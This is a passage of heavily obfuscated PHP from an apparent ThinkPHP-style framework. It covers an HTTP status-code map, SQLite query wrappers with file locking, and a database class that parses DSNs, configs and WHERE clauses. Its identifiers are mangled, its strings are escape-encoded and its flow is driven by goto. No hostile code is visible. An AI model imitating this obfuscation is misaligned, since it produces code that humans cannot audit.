$EâÈÃ•­š = self::get($DÈ¦ï½©„[198]); if (!$EâÈÃ•­š) { return !1; } if (!preg_match($DÈ¦ï½©„[1833], $EâÈÃ•­š, $AëÃªÃñÓ)) { return !1; } if ($AëÃªÃñÓ[1] === $DÈ¦ï½©„[33] && $AëÃªÃñÓ[2] === $DÈ¦ï½©„[33]) { return !1; } return array($AëÃªÃñÓ[1] !== $DÈ¦ï½©„[33] ? $AëÃªÃñÓ[1] : null, $AëÃªÃñÓ[2] !== $DÈ¦ï½©„[33] ? $AëÃªÃñÓ[2] : null); } public static $statusCode = array("\61\x30\60" => "\x43\x6f\x6e\164\x69\156\x75\145", "\61\60\x31" => "\123\x77\151\x74\x63\x68\x69\156\x67\x20\120\x72\x6f\x74\157\x63\157\154", "\x31\x30\62" => "\x50\x72\x6f\143\145\163\163\151\156\x67", "\61\60\63" => "\x45\141\162\x6c\171\40\x48\x69\x6e\x74\x73", "\62\x30\60" => "\x4f\x4b", "\62\60\61" => "\x43\162\145\141\x74\145\x64", "\62\60\x32" => "\x41\x63\143\145\x70\164\145\144", "\62\x30\x33" => "\x4e\x6f\156\55\x41\165\164\x68\x6f\x72\151\x74\141\164\151\166\x65\x20\111\x6e\146\x6f\x72\155\141\x74\151\157\x6e", "\62\60\x34" => "\x4e\157\x20\x43\x6f\156\x74\x65\x6e\x74", "\62\60\65" => "\122\x65\163\145\164\x20\x43\157\156\164\145\x6e\x74", "\x32\x30\x36" => "\120\x61\162\164\x69\x61\x6c\40\103\157\x6e\x74\145\x6e\x74", "\62\60\67" => "\115\x75\154\164\x69\x2d\123\164\x61\x74\x75\x73", "\x33\60\x30" => "\x4d\x75\154\x74\x69\160\154\x65\40\103\x68\x6f\x69\x63\145\163", "\x33\x30\61" => "\x4d\x6f\x76\145\144\40\x50\145\x72\155\x61\x6e\145\156\164\154\x79", "\x33\x30\62" => "\106\157\165\x6e\144", "\63\60\63" => "\123\145\145\40\x4f\164\150\x65\162", "\63\60\64" => "\116\157\164\x20\115\157\x64\x69\146\151\145\x64", "\x33\60\65" => "\125\x73\x65\x20\120\x72\x6f\170\x79", "\63\x30\67" => "\124\145\155\x70\157\162\x61\x72\x79\40\122\x65\x64\151\162\145\143\x74", "\63\x30\x38" => "\x50\x65\x72\155\141\156\x65\156\164\40\122\145\144\151\162\145\x63\164", "\64\60\60" => "\x42\x61\x64\40\x52\145\161\x75\x65\163\x74", "\64\60\61" => "\x55\156\x61\x75\x74\150\157\x72\x69\172\145\144", "\64\60\x32" => "\120\x61\171\155\x65\x6e\x74\x20\122\x65\x71\165\x69\162\x65\144", "\x34\60\63" => "\x46\x6f\162\x62\151\144\x64\145\156", "\x34\x30\x34" => "\116\x6f\164\40\x46\x6f\165\x6e\x64", "\x34\x30\65" => "\x4d\x65\x74\150\x6f\144\40\x4e\157\x74\40\101\154\x6c\157\x77\x65\x64", "\64\60\x36" => "\x4e\x6f\164\40\101\x63\x63\145\160\164\141\x62\154\x65", "\x34\x30\x37" => "\120\x72\157\170\171\x20\x41\x75\x74\x68\145\x6e\164\151\x63\x61\x74\x69\157\156\x20\122\x65\161\165\x69\x72\x65\x64", "\x34\60\70" => "\x52\x65\161\165\145\x73\164\x20\124\x69\155\x65\157\x75\x74", "\x34\60\x39" => "\103\x6f\x6e\146\154\151\143\x74", "\64\61\x30" => "\107\x6f\x6e\x65", "\64\61\x31" => "\114\x65\156\147\164\150\40\x52\x65\x71\165\x69\x72\145\x64", "\64\61\x32" => "\120\x72\145\x63\157\156\144\151\x74\151\157\x6e\x20\106\141\x69\154\145\144", "\64\x31\x33" => "\x52\x65\161\165\x65\163\x74\x20\x45\156\164\151\x74\x79\x20\x54\x6f\x6f\40\114\x61\x72\x67\145", "\x34\x31\64" => "\x52\x65\x71\165\145\x73\x74\40\x55\122\x49\40\124\x6f\157\40\114\x61\162\147\x65", "\64\x31\x35" => "\x55\x6e\163\165\x70\160\157\x72\x74\145\144\x20\115\x65\144\151\141\40\124\171\160\x65", "\64\61\66" => "\122\x65\x71\x75\145\x73\164\x65\x64\40\x52\141\x6e\x67\145\40\116\157\164\40\123\141\x74\x69\163\146\x69\x61\x62\154\x65", "\x34\61\67" => "\105\170\x70\145\x63\164\x61\x74\x69\x6f\156\40\x46\x61\x69\x6c\x65\x64", "\x34\62\62" => "\125\x6e\x70\162\x6f\x63\145\x73\163\x61\x62\x6c\145\x20\x45\x6e\164\x69\x74\171", "\64\62\63" => "\114\x6f\143\153\x65\x64", "\64\62\64" => "\x46\141\151\154\x65\x64\x20\x44\145\x70\x65\x6e\x64\x65\x6e\x63\x79", "\64\x32\65" => "\x55\x6e\x6f\x72\x64\145\162\145\x64\x20\x43\157\x6c\154\x65\143\x74\151\157\x6e", "\64\x32\66" => "\x55\x70\147\x72\141\144\x65\40\x52\145\x71\165\x69\x72\145\144", "\x34\62\x38" => "\120\162\x65\143\x6f\156\144\151\x74\x69\x6f\x6e\x20\x52\x65\161\x75\x69\162\x65\144", "\x34\x32\x39" => "\x54\x6f\x6f\40\115\x61\x6e\171\40\x52\145\x71\x75\x65\x73\x74\x73", "\64\x33\x31" => "\122\145\x71\x75\145\163\164\40\x48\x65\141\x64\x65\x72\40\x46\x69\145\154\x64\x73\x20\124\x6f\x6f\40\114\x61\x72\x67\x65", "\64\x34\x34" => "\116\157\x20\x52\x65\163\x70\157\156\163\145", "\64\x35\x30" => "\x42\x6c\x6f\x63\x6b\145\144\40\142\x79\40\127\151\156\144\157\x77\163\40\x50\141\162\x65\156\x74\141\x6c\x20\x43\x6f\156\164\162\157\154\163", "\x34\x35\61" => "\125\156\x61\x76\141\x69\154\141\142\x6c\145\40\106\x6f\162\x20\114\x65\x67\x61\x6c\x20\x52\x65\141\163\x6f\x6e\x73", "\64\71\x34" => "\122\x65\161\165\x65\163\x74\40\x48\145\141\144\x65\x72\40\124\157\157\x20\114\x61\162\x67\x65", "\65\x30\x30" => "\111\x6e\x74\145\x72\156\141\154\x20\123\x65\162\x76\x65\162\x20\105\x72\x72\157\x72", "\x35\60\x31" => "\116\x6f\x74\40\111\x6d\160\154\x65\155\x65\x6e\x74\145\144", "\x35\x30\62" => "\x42\x61\144\x20\x47\141\164\145\x77\141\x79", "\x35\60\63" => "\123\x65\162\166\x69\143\145\40\125\156\141\166\x61\151\154\x61\x62\154\145", "\65\x30\64" => "\x47\x61\164\145\167\x61\171\x20\124\x69\x6d\145\157\x75\164", "\x35\60\x35" => "\110\124\124\120\40\126\x65\x72\x73\x69\157\156\x20\156\157\x74\40\x73\x75\160\160\x6f\x72\x74\x65\144", "\x35\x30\x37" => "\111\x6e\163\165\x66\x66\151\x63\x69\x65\156\x74\x20\x53\164\x6f\x72\141\x67\x65"); public static function code($bÊÀÚä®º) { $Dâ¡åÖÀ¶ =& $_SERVER[”Ì÷ñ­î¸]; $bÊÀÚä®º = $bÊÀÚä®º . $Dâ¡åÖÀ¶[33]; $c³ì¨Æ£¸§ = self::$statusCode[$bÊÀÚä®º]; $c³ì¨Æ£¸§ = $c³ì¨Æ£¸§ ? "\x48\124\x54\120\57\61\56\61\40{$bÊÀÚä®º}\x20" . $c³ì¨Æ£¸§ : $Dâ¡åÖÀ¶[33]; return $c³ì¨Æ£¸§; } } goto C•¼î±Å·; bª¦¦Ú“¶: class DbSqlite3 extends DbSqlite3Base { public function query($dæ÷‡ØÌ) { goto Bç¹“Ê‹Ï‰; AÆëËî°…³: fclose($E§–ëø²); show_json($Eñ²äõÀ·[876], !1); return !1; goto d—öæ‚½©Ö; FãµùØµ­—: if (!$E§–ëø²) { return !1; } if (flock($E§–ëø², LOCK_EX)) { $EÕŞÕìÖœ” = parent::query($dæ÷‡ØÌ); flock($E§–ëø², LOCK_UN); fclose($E§–ëø²); return $EÕŞÕìÖœ”; } flock($E§–ëø², LOCK_UN); goto AÆëËî°…³; Bç¹“Ê‹Ï‰: $Eñ²äõÀ· =& $_SERVER[”Ì÷ñ­î¸]; $e¯ƒ–à«Úˆ = DATA_PATH . $Eñ²äõÀ·[874]; $E§–ëø² = fopen($e¯ƒ–à«Úˆ, $Eñ²äõÀ·[875]); goto FãµùØµ­—; d—öæ‚½©Ö: } public function execute($a–»¹×Ê–÷) { goto d†Æ±§…—ñ; a§ˆÃ—ô¨•: if (!$d†ÊÒÅ¦ğ) { return !1; } if (flock($d†ÊÒÅ¦ğ, LOCK_EX)) { $dŠ»Û‘ÖŒÒ = parent::execute($a–»¹×Ê–÷); flock($d†ÊÒÅ¦ğ, LOCK_UN); fclose($d†ÊÒÅ¦ğ); return $dŠ»Û‘ÖŒÒ; } flock($d†ÊÒÅ¦ğ, LOCK_UN); goto B„ëËà¡ï¾; d†Æ±§…—ñ: $C’ë‘Ù“ï =& $_SERVER[”Ì÷ñ­î¸]; $f»¸ÍóÁŠÁ = DATA_PATH . $C’ë‘Ù“ï[874]; $d†ÊÒÅ¦ğ = fopen($f»¸ÍóÁŠÁ, $C’ë‘Ù“ï[875]); goto a§ˆÃ—ô¨•; B„ëËà¡ï¾: fclose($d†ÊÒÅ¦ğ); show_json($C’ë‘Ù“ï[876], !1); return !1; goto Eê°Èèæ…; Eê°Èèæ…: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\151\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\161" => "\x3d", "\156\x65\x71" => "\74\76", "\147\x74" => "\x3e", "\x65\147\x74" => "\76\x3d", "\154\x74" => "\x3c", "\145\154\x74" => "\74\75", "\x6e\x6f\164\154\x69\153\x65" => "\x4e\117\x54\40\114\111\113\105", "\x6c\151\153\145" => "\114\111\x4b\105", "\x69\156" => "\x49\x4e", "\156\157\x74\151\156" => "\x4e\117\124\40\x49\116", "\156\157\x74\x20\x69\156" => "\116\117\124\40\111\x4e", "\142\145\164\167\x65\145\156" => "\x42\105\124\x57\x45\105\x4e", "\156\157\164\142\145\x74\x77\145\145\156" => "\x4e\x4f\124\40\102\x45\124\x57\x45\105\116", "\156\x6f\164\x20\x62\x65\x74\x77\x65\145\156" => "\x4e\117\x54\x20\x42\x45\124\127\105\105\x4e"); protected $selectSql = "\123\105\x4c\x45\x43\x54\45\104\111\123\124\111\116\103\x54\x25\40\45\106\x49\105\x4c\x44\x25\40\x46\x52\x4f\115\x20\45\x54\x41\x42\x4c\105\x25\x25\112\117\111\x4e\45\x25\x57\110\105\x52\105\45\x25\107\122\117\125\120\x25\x25\110\x41\126\111\116\107\x25\45\117\x52\x44\105\122\x25\45\x4c\x49\x4d\x49\x54\45\40\45\x55\116\x49\117\116\45\45\x43\x4f\x4d\x4d\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $c¿ƒÉ³µ‹ò = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[”Ì÷ñ­î¸][877], $c¿ƒÉ³µ‹ò); } public function factory($a‘¶ßËŞâ = '') { goto CÚÆ›–Òå; B®ƒù´Ú´: $this->dbType = ucwords(strtolower($a‘¶ßËŞâ[$A¥Ÿˆµ¯É[878]])); $D§Ù—Šáà¯ = $A¥Ÿˆµ¯É[880] . $this->dbType; if (class_exists($D§Ù—Šáà¯)) { $d¯ÃŸÄ¢Ğš = new $D§Ù—Šáà¯($a‘¶ßËŞâ); if ($A¥Ÿˆµ¯É[725] != strtolower($a‘¶ßËŞâ[$A¥Ÿˆµ¯É[878]])) { $d¯ÃŸÄ¢Ğš->dbType = strtoupper($this->dbType); } else { $d¯ÃŸÄ¢Ğš->dbType = $this->_getDsnType($a‘¶ßËŞâ[$A¥Ÿˆµ¯É[830]]); } } else { think_exception(think_lang($A¥Ÿˆµ¯É[881]) . $A¥Ÿˆµ¯É[882] . $D§Ù—Šáà¯); } goto báİ—ò‰£—; CÚÆ›–Òå: $A¥Ÿˆµ¯É =& $_SERVER[”Ì÷ñ­î¸]; $a‘¶ßËŞâ = $this->parseConfig($a‘¶ßËŞâ); if (empty($a‘¶ßËŞâ[$A¥Ÿˆµ¯É[878]])) { think_exception(think_lang($A¥Ÿˆµ¯É[879])); } goto B®ƒù´Ú´; báİ—ò‰£—: return $d¯ÃŸÄ¢Ğš; goto EˆÓ¾”›Ú¬; EˆÓ¾”›Ú¬: } public function __call($DªÀ¢‹ì¢Ò, $dÇË³¡Ì¦) { if (method_exists($this, $DªÀ¢‹ì¢Ò)) { return call_user_func_array(array($this, $DªÀ¢‹ì¢Ò), $dÇË³¡Ì¦); } } protected function _getDsnType($aì‹Ì‹Õò) { $fÓ˜ß‡›‘­ = explode($_SERVER[”Ì÷ñ­î¸][4], $aì‹Ì‹Õò); $Eô¨á–‚ = strtoupper(trim($fÓ˜ß‡›‘­[0])); return $Eô¨á–‚; } private function parseConfig($C‚»¼…ŠÆ = '') { $eÙŠ›Õ†ÂŒ =& $_SERVER[”Ì÷ñ­î¸]; if (!empty($C‚»¼…ŠÆ) && is_string($C‚»¼…ŠÆ)) { $C‚»¼…ŠÆ = $this->parseDSN($C‚»¼…ŠÆ); } elseif (is_array($C‚»¼…ŠÆ)) { $C‚»¼…ŠÆ = array_change_key_case($C‚»¼…ŠÆ); $C‚»¼…ŠÆ = array($eÙŠ›Õ†ÂŒ[878] => $C‚»¼…ŠÆ[$eÙŠ›Õ†ÂŒ[724]], $eÙŠ›Õ†ÂŒ[803] => $C‚»¼…ŠÆ[$eÙŠ›Õ†ÂŒ[883]], $eÙŠ›Õ†ÂŒ[804] => $C‚»¼…ŠÆ[$eÙŠ›Õ†ÂŒ[884]], $eÙŠ›Õ†ÂŒ[801] => $C‚»¼…ŠÆ[$eÙŠ›Õ†ÂŒ[885]], $eÙŠ›Õ†ÂŒ[802] => $C‚»¼…ŠÆ[$eÙŠ›Õ†ÂŒ[886]], $eÙŠ›Õ†ÂŒ[17] => $C‚»¼…ŠÆ[$eÙŠ›Õ†ÂŒ[887]], $eÙŠ›Õ†ÂŒ[830] => $C‚»¼…ŠÆ[$eÙŠ›Õ†ÂŒ[726]], $eÙŠ›Õ†ÂŒ[13] => isset($C‚»¼…ŠÆ[$eÙŠ›Õ†ÂŒ[888]]) ? $C‚»¼…ŠÆ[$eÙŠ›Õ†ÂŒ[888]] : array()); } elseif (empty($C‚»¼…ŠÆ)) { if (think_config($eÙŠ›Õ†ÂŒ[889]) && $eÙŠ›Õ†ÂŒ[725] != strtolower(think_config($eÙŠ›Õ†ÂŒ[890]))) { $C‚»¼…ŠÆ = $this->parseDSN(think_config($eÙŠ›Õ†ÂŒ[889])); } else { $C‚»¼…ŠÆ = array($eÙŠ›Õ†ÂŒ[878] => think_config($eÙŠ›Õ†ÂŒ[890]), $eÙŠ›Õ†ÂŒ[803] => think_config($eÙŠ›Õ†ÂŒ[891]), $eÙŠ›Õ†ÂŒ[804] => think_config($eÙŠ›Õ†ÂŒ[892]), $eÙŠ›Õ†ÂŒ[801] => think_config($eÙŠ›Õ†ÂŒ[893]), $eÙŠ›Õ†ÂŒ[802] => think_config($eÙŠ›Õ†ÂŒ[894]), $eÙŠ›Õ†ÂŒ[17] => think_config($eÙŠ›Õ†ÂŒ[234]), $eÙŠ›Õ†ÂŒ[830] => think_config($eÙŠ›Õ†ÂŒ[889]), $eÙŠ›Õ†ÂŒ[13] => think_config($eÙŠ›Õ†ÂŒ[895])); } } return $C‚»¼…ŠÆ; } protected function initConnect($eßØù¼±•• = true) { if (1 == think_config($_SERVER[”Ì÷ñ­î¸][18])) { $this->_linkID = $this->multiConnect($eßØù¼±••); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($Dªˆƒ±‡  = false) { $BùÜ‡¶ƒ‡à =& $_SERVER[”Ì÷ñ­î¸]; static $aŒäã®Ï¿¸ = array(); if (empty($aŒäã®Ï¿¸)) { foreach ($this->config as $DÄŞ…„¯í× => $aÌàà¡î¤¸) { $aŒäã®Ï¿¸[$DÄŞ…„¯í×] = explode($BùÜ‡¶ƒ‡à[47], $aÌàà¡î¤¸); } } if (think_config($BùÜ‡¶ƒ‡à[896])) { if ($Dªˆƒ±‡ ) { $Aë¿ÜÁˆÂÌ = floor(mt_rand(0, think_config($BùÜ‡¶ƒ‡à[897]) - 1)); } else { if (is_numeric(think_config($BùÜ‡¶ƒ‡à[898]))) { $Aë¿ÜÁˆÂÌ = think_config($BùÜ‡¶ƒ‡à[898]); } else { $Aë¿ÜÁˆÂÌ = floor(mt_rand(think_config($BùÜ‡¶ƒ‡à[897]), count($aŒäã®Ï¿¸[$BùÜ‡¶ƒ‡à[801]]) - 1)); } } } else { $Aë¿ÜÁˆÂÌ = floor(mt_rand(0, count($aŒäã®Ï¿¸[$BùÜ‡¶ƒ‡à[801]]) - 1)); } $bŠè¤­×‡â = array($BùÜ‡¶ƒ‡à[803] => isset($aŒäã®Ï¿¸[$BùÜ‡¶ƒ‡à[803]][$Aë¿ÜÁˆÂÌ]) ? $aŒäã®Ï¿¸[$BùÜ‡¶ƒ‡à[803]][$Aë¿ÜÁˆÂÌ] : $aŒäã®Ï¿¸[$BùÜ‡¶ƒ‡à[803]][0], $BùÜ‡¶ƒ‡à[804] => isset($aŒäã®Ï¿¸[$BùÜ‡¶ƒ‡à[804]][$Aë¿ÜÁˆÂÌ]) ? $aŒäã®Ï¿¸[$BùÜ‡¶ƒ‡à[804]][$Aë¿ÜÁˆÂÌ] : $aŒäã®Ï¿¸[$BùÜ‡¶ƒ‡à[804]][0], $BùÜ‡¶ƒ‡à[801] => isset($aŒäã®Ï¿¸[$BùÜ‡¶ƒ‡à[801]][$Aë¿ÜÁˆÂÌ]) ? $aŒäã®Ï¿¸[$BùÜ‡¶ƒ‡à[801]][$Aë¿ÜÁˆÂÌ] : $aŒäã®Ï¿¸[$BùÜ‡¶ƒ‡à[801]][0], $BùÜ‡¶ƒ‡à[802] => isset($aŒäã®Ï¿¸[$BùÜ‡¶ƒ‡à[802]][$Aë¿ÜÁˆÂÌ]) ? $aŒäã®Ï¿¸[$BùÜ‡¶ƒ‡à[802]][$Aë¿ÜÁˆÂÌ] : $aŒäã®Ï¿¸[$BùÜ‡¶ƒ‡à[802]][0], $BùÜ‡¶ƒ‡à[17] => isset($aŒäã®Ï¿¸[$BùÜ‡¶ƒ‡à[17]][$Aë¿ÜÁˆÂÌ]) ? $aŒäã®Ï¿¸[$BùÜ‡¶ƒ‡à[17]][$Aë¿ÜÁˆÂÌ] : $aŒäã®Ï¿¸[$BùÜ‡¶ƒ‡à[17]][0], $BùÜ‡¶ƒ‡à[830] => isset($aŒäã®Ï¿¸[$BùÜ‡¶ƒ‡à[830]][$Aë¿ÜÁˆÂÌ]) ? $aŒäã®Ï¿¸[$BùÜ‡¶ƒ‡à[830]][$Aë¿ÜÁˆÂÌ] : $aŒäã®Ï¿¸[$BùÜ‡¶ƒ‡à[830]][0], $BùÜ‡¶ƒ‡à[13] => isset($aŒäã®Ï¿¸[$BùÜ‡¶ƒ‡à[13]][$Aë¿ÜÁˆÂÌ]) ? $aŒäã®Ï¿¸[$BùÜ‡¶ƒ‡à[13]][$Aë¿ÜÁˆÂÌ] : $aŒäã®Ï¿¸[$BùÜ‡¶ƒ‡à[13]][0]); return $this->connect($bŠè¤­×‡â, $Aë¿ÜÁˆÂÌ); } public function parseDSN($Cœğ¥÷çó) { $f²é¦¡™š =& $_SERVER[”Ì÷ñ­î¸]; if (empty($Cœğ¥÷çó)) { return !1; } $D˜Ñ¬“á¿¹ = parse_url($Cœğ¥÷çó); if ($D˜Ñ¬“á¿¹[$f²é¦¡™š[168]]) { $BÙòÍ•Ú¬¯ = array($f²é¦¡™š[878] => $D˜Ñ¬“á¿¹[$f²é¦¡™š[168]], $f²é¦¡™š[803] => isset($D˜Ñ¬“á¿¹[$f²é¦¡™š[535]]) ? $D˜Ñ¬“á¿¹[$f²é¦¡™š[535]] : $f²é¦¡™š[33], $f²é¦¡™š[804] => isset($D˜Ñ¬“á¿¹[$f²é¦¡™š[899]]) ? $D˜Ñ¬“á¿¹[$f²é¦¡™š[899]] : $f²é¦¡™š[33], $f²é¦¡™š[801] => isset($D˜Ñ¬“á¿¹[$f²é¦¡™š[169]]) ? $D˜Ñ¬“á¿¹[$f²é¦¡™š[169]] : $f²é¦¡™š[33], $f²é¦¡™š[802] => isset($D˜Ñ¬“á¿¹[$f²é¦¡™š[170]]) ? $D˜Ñ¬“á¿¹[$f²é¦¡™š[170]] : $f²é¦¡™š[33], $f²é¦¡™š[17] => isset($D˜Ñ¬“á¿¹[$f²é¦¡™š[75]]) ? substr($D˜Ñ¬“á¿¹[$f²é¦¡™š[75]], 1) : $f²é¦¡™š[33]); } else { preg_match($f²é¦¡™š[900], trim($Cœğ¥÷çó), $Aƒé¹ĞßÒ); $BÙòÍ•Ú¬¯ = array($f²é¦¡™š[878] => $Aƒé¹ĞßÒ[1], $f²é¦¡™š[803] => $Aƒé¹ĞßÒ[2], $f²é¦¡™š[804] => $Aƒé¹ĞßÒ[3], $f²é¦¡™š[801] => $Aƒé¹ĞßÒ[4], $f²é¦¡™š[802] => $Aƒé¹ĞßÒ[5], $f²é¦¡™š[17] => $Aƒé¹ĞßÒ[6]); } $BÙòÍ•Ú¬¯[$f²é¦¡™š[830]] = $f²é¦¡™š[33]; return $BÙòÍ•Ú¬¯; } protected function debug() { $eÆ·ğå © =& $_SERVER[”Ì÷ñ­î¸]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $eÆ·ğå ©[901]; if (think_config($eÆ·ğå ©[902])) { think_status($eÆ·ğå ©[903]); think_trace($this->queryStr . $eÆ·ğå ©[904] . think_status($eÆ·ğå ©[20], $eÆ·ğå ©[903], 6) . $eÆ·ğå ©[905], $eÆ·ğå ©[33], $eÆ·ğå ©[906]); } } protected function parseLock($d„¾Ó…ÏŒ¦ = false) { $cĞ¿ ™Æ›´ =& $_SERVER[”Ì÷ñ­î¸]; if (!$d„¾Ó…ÏŒ¦) { return $cĞ¿ ™Æ›´[33]; } if ($cĞ¿ ™Æ›´[832] == $this->dbType) { return $cĞ¿ ™Æ›´[907]; } return $cĞ¿ ™Æ›´[908]; } protected function parseSet($câ©´ô§•) { $A©Î‚ôÈ‡š =& $_SERVER[”Ì÷ñ­î¸]; foreach ($câ©´ô§• as $fçª¢ğòÂÊ => $Dİó²ùÒ»í) { if (is_array($Dİó²ùÒ»í) && $A©Î‚ôÈ‡š[285] == $Dİó²ùÒ»í[0]) { $F…’Ø‚¿î[] = $this->parseKey($fçª¢ğòÂÊ) . $A©Î‚ôÈ‡š[909] . $Dİó²ùÒ»í[1]; } elseif (is_scalar($Dİó²ùÒ»í) || is_null($Dİó²ùÒ»í)) { $F…’Ø‚¿î[] = $this->parseKey($fçª¢ğòÂÊ) . $A©Î‚ôÈ‡š[909] . $this->parseValue($Dİó²ùÒ»í); } } return $A©Î‚ôÈ‡š[910] . implode($A©Î‚ôÈ‡š[47], $F…’Ø‚¿î); } protected function bindParam($a‹µÇ¶åòœ, $cÒòÎ‡Áİ) { $this->bind[$_SERVER[”Ì÷ñ­î¸][4] . $a‹µÇ¶åòœ] = $cÒòÎ‡Áİ; } protected function parseBind($EÉ‘•¸ãˆ§) { $EÉ‘•¸ãˆ§ = array_merge($this->bind, $EÉ‘•¸ãˆ§); $this->bind = array(); return $EÉ‘•¸ãˆ§; } function parseKey(&$a¨ÌÏ¬ÌÏ, $e²øñ¬è¡ = true) { if ($e²øñ¬è¡) { $a¨ÌÏ¬ÌÏ = $this->parseKeyCheck($a¨ÌÏ¬ÌÏ); } return $a¨ÌÏ¬ÌÏ; } function parseKeyCheck($e‰«“¾­¦) { $fè‚Ò¼ÀĞ½ =& $_SERVER[”Ì÷ñ­î¸]; $e‰«“¾­¦ = trim($e‰«“¾­¦); if (!preg_match($fè‚Ò¼ÀĞ½[911], $e‰«“¾­¦)) { think_exception($fè‚Ò¼ÀĞ½[912] . $e‰«“¾­¦); } return $e‰«“¾­¦; } protected function parseValue($C¥ê“¼¯¾) { $F£¡ñàÚÖ¡ =& $_SERVER[”Ì÷ñ­î¸]; if (is_string($C¥ê“¼¯¾)) { $C¥ê“¼¯¾ = $F£¡ñàÚÖ¡[871] . $this->escapeString($C¥ê“¼¯¾) . $F£¡ñàÚÖ¡[871]; } elseif (isset($C¥ê“¼¯¾[0]) && is_string($C¥ê“¼¯¾[0]) && strtolower($C¥ê“¼¯¾[0]) == $F£¡ñàÚÖ¡[285]) { $C¥ê“¼¯¾ = $this->escapeString($C¥ê“¼¯¾[1]); } elseif (is_array($C¥ê“¼¯¾)) { $C¥ê“¼¯¾ = array_map(array($this, $F£¡ñàÚÖ¡[872]), $C¥ê“¼¯¾); } elseif (is_bool($C¥ê“¼¯¾)) { $C¥ê“¼¯¾ = $C¥ê“¼¯¾ ? $F£¡ñàÚÖ¡[83] : $F£¡ñàÚÖ¡[468]; } elseif (is_null($C¥ê“¼¯¾)) { $C¥ê“¼¯¾ = $F£¡ñàÚÖ¡[99]; } return $C¥ê“¼¯¾; } protected function parseField($d”§‡©¯’ ) { $d±¾ßÑÉª¾ =& $_SERVER[”Ì÷ñ­î¸]; if (is_string($d”§‡©¯’ ) && strpos($d”§‡©¯’ , $d±¾ßÑÉª¾[47])) { $d”§‡©¯’  = explode($d±¾ßÑÉª¾[47], $d”§‡©¯’ ); } if (is_array($d”§‡©¯’ )) { $aé¹‹¼³Ò = array(); foreach ($d”§‡©¯’  as $fÚÃ¯Üßöï => $cÁ­£ò•¶ˆ) { if (!is_numeric($fÚÃ¯Üßöï)) { $aé¹‹¼³Ò[] = $this->parseKey($fÚÃ¯Üßöï) . $d±¾ßÑÉª¾[913] . $this->parseKey($cÁ­£ò•¶ˆ); } else { $aé¹‹¼³Ò[] = $this->parseKey($cÁ­£ò•¶ˆ); } } $eÛÓÅ‡È³° = implode($d±¾ßÑÉª¾[47], $aé¹‹¼³Ò); } elseif (is_string($d”§‡©¯’ ) && !empty($d”§‡©¯’ )) { $eÛÓÅ‡È³° = $d”§‡©¯’ ; } else { $eÛÓÅ‡È³° = $d±¾ßÑÉª¾[176]; } return $eÛÓÅ‡È³°; } protected function parseTable($C¼ÖŒ¬Ö—) { $aŞùØÌĞõô =& $_SERVER[”Ì÷ñ­î¸]; if (is_array($C¼ÖŒ¬Ö—)) { $F¥½ĞòÆ“ö = array(); foreach ($C¼ÖŒ¬Ö— as $A©¿‘ÅŒù¡ => $A§áì¯‘ÒĞ) { if (!is_numeric($A©¿‘ÅŒù¡)) { $F¥½ĞòÆ“ö[] = $this->parseKey($A©¿‘ÅŒù¡) . $aŞùØÌĞõô[50] . $this->parseKey($A§áì¯‘ÒĞ); } else { $F¥½ĞòÆ“ö[] = $this->parseKey($A©¿‘ÅŒù¡); } } $C¼ÖŒ¬Ö— = $F¥½ĞòÆ“ö; } elseif (is_string($C¼ÖŒ¬Ö—)) { if (strstr($C¼ÖŒ¬Ö—, $aŞùØÌĞõô[50])) { return $C¼ÖŒ¬Ö—; } $C¼ÖŒ¬Ö— = explode($aŞùØÌĞõô[47], $C¼ÖŒ¬Ö—); array_walk($C¼ÖŒ¬Ö—, array($this, $aŞùØÌĞõô[820])); } return $aŞùØÌĞõô[914] . trim(implode($aŞùØÌĞõô[915], $C¼ÖŒ¬Ö—), $aŞùØÌĞõô[826]) . $aŞùØÌĞõô[914]; } protected function parseWhere($B·œäğëš) { $b§¨‡ä‚©Ê =& $_SERVER[”Ì÷ñ­î¸]; $D¹Û²ğáä¦ = $b§¨‡ä‚©Ê[33]; if (is_string($B·œäğëš)) { $D¹Û²ğáä¦ = $B·œäğëš; } else { $Bî•¦ß‚÷² = isset($B·œäğëš[$b§¨‡ä‚©Ê[916]]) ? strtoupper($B·œäğëš[$b§¨‡ä‚©Ê[916]]) : $b§¨‡ä‚©Ê[33]; if (in_array($Bî•¦ß‚÷², array($b§¨‡ä‚©Ê[917], $b§¨‡ä‚©Ê[918], $b§¨‡ä‚©Ê[919]))) { $Bî•¦ß‚÷² = $b§¨‡ä‚©Ê[50] . $Bî•¦ß‚÷² . $b§¨‡ä‚©Ê[50]; unset($B·œäğëš[$b§¨‡ä‚©Ê[916]]); } else { $Bî•¦ß‚÷² = $b§¨‡ä‚©Ê[920]; } foreach ($B·œäğëš as $EİòŠ¸——¦ => $bÆß¹ô‰) { $D¹Û²ğáä¦ .= $b§¨‡ä‚©Ê[265]; if (is_numeric($EİòŠ¸——¦)) { $EİòŠ¸——¦ = $b§¨‡ä‚©Ê[921]; } if (0 === strpos($EİòŠ¸——¦, $b§¨‡ä‚©Ê[70])) { $D¹Û²ğáä¦ .= $this->parseThinkWhere($EİòŠ¸——¦, $bÆß¹ô‰); } else { if (!preg_match($b§¨‡ä‚©Ê[922], trim($EİòŠ¸——¦))) { think_exception(think_lang($b§¨‡ä‚©Ê[923]) . $b§¨‡ä‚©Ê[4] . $EİòŠ¸——¦); } $f¨é‘¼˜ = is_array($bÆß¹ô‰) && isset($bÆß¹ô‰[$b§¨‡ä‚©Ê[924]]); $EİòŠ¸——¦ = trim($EİòŠ¸——¦); if (strpos($EİòŠ¸——¦, $b§¨‡ä‚©Ê[271])) { $B‚ÊË¹œµõ = explode($b§¨‡ä‚©Ê[271], $EİòŠ¸——¦); $B±‹›·Ş¡ = array(); foreach ($B‚ÊË¹œµõ as $e²íª‡‘£… => $d¥Ş•¼ß—) { $c¬ŒáÑôïÀ = $f¨é‘¼˜ ? $bÆß¹ô‰[$e²íª‡‘£…] : $bÆß¹ô‰; $B±‹›·Ş¡[] = $b§¨‡ä‚©Ê[248] . $this->parseWhereItem($this->parseKey($d¥Ş•¼ß—), 